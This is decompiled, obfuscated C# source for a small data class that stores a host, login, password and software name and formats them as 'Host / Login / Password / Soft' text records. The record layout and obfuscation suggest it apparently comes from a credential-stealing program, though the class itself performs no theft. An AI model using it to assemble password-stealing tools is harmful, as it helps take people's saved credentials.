using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

// Token: 0x02000042 RID: 66
internal class Class27
{
	// Token: 0x06000208 RID: 520 RVA: 0x00002E23 File Offset: 0x00001023
	[CompilerGenerated]
	public string method_0()
	{
		return this.string_0;
	}

	// Token: 0x06000209 RID: 521 RVA: 0x00002E2B File Offset: 0x0000102B
	[CompilerGenerated]
	public void method_1(string string_4)
	{
		this.string_0 = string_4;
	}

	// Token: 0x0600020A RID: 522 RVA: 0x00002E34 File Offset: 0x00001034
	[CompilerGenerated]
	public string method_2()
	{
		return this.string_1;
	}

	// Token: 0x0600020B RID: 523 RVA: 0x00002E3C File Offset: 0x0000103C
	[CompilerGenerated]
	public void method_3(string string_4)
	{
		this.string_1 = string_4;
	}

	// Token: 0x0600020C RID: 524 RVA: 0x00002E45 File Offset: 0x00001045
	[CompilerGenerated]
	public string method_4()
	{
		return this.string_2;
	}

	// Token: 0x0600020D RID: 525 RVA: 0x00002E4D File Offset: 0x0000104D
	[CompilerGenerated]
	public void method_5(string string_4)
	{
		this.string_2 = string_4;
	}

	// Token: 0x0600020E RID: 526 RVA: 0x00002E56 File Offset: 0x00001056
	[CompilerGenerated]
	public string method_6()
	{
		return this.string_3;
	}

	// Token: 0x0600020F RID: 527 RVA: 0x00002E5E File Offset: 0x0000105E
	[CompilerGenerated]
	public void method_7(string string_4)
	{
		this.string_3 = string_4;
	}

	// Token: 0x06000210 RID: 528 RVA: 0x000107C0 File Offset: 0x0000E9C0
	public override string ToString()
	{
		return string.Format("Host: {0}\r\nLogin: {1}\r\nPassword: {2}\r\nSoft: {3}\r\n \r\n", new object[]
		{
			this.method_0(),
			this.method_2(),
			this.method_4(),
			this.method_6()
		});
	}

	// Token: 0x06000211 RID: 529 RVA: 0x0000276F File Offset: 0x0000096F
	public Class27()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}

	// Token: 0x040000E1 RID: 225
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string string_0;

	// Token: 0x040000E2 RID: 226
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private string string_1;

	// Token: 0x040000E3 RID: 227
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private string string_2;

	// Token: 0x040000E4 RID: 228
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string string_3;
}
